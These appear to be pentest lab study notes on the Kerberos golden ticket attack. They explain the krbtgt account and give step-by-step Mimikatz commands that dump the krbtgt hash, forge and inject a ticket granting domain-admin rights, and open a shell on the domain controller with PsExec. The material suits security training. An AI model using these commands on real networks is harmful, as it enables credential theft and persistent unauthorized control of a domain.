# Overview
>When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is the password hash of a domain user account called [_krbtgt_](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)#Sec_KRBTGT).
>If we can get our hands on the _krbtgt_ password hash, we could create our own self-made custom TGTs, also known as [_golden tickets_](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf).

# Exploit
For example, we could create a TGT stating that a non-privileged user is a member of the Domain Admins group, and the domain controller will trust it because it is correctly encrypted. This provides a neat way of keeping persistence in an Active Directory environment, but the best advantage is that the _krbtgt_ account password is not automatically changed.

>The golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself to work as a persistence method. With this kind of access, we can extract the password hash of the _krbtgt_ account with Mimikatz.

- Gather the hash of the krbtgt account :
```cmd
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
```

>Creating the golden ticket and injecting it into memory does not require any administrative privileges and can even be performed from a computer that is not joined to the domain.

```cmd
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
mimikatz # misc::cmd
```

- The golden ticket is injected into memory. It has added our user to Domain Admin Group.
```cmd
PsExec.exe \\dc1 cmd.exe
whoami /priv
```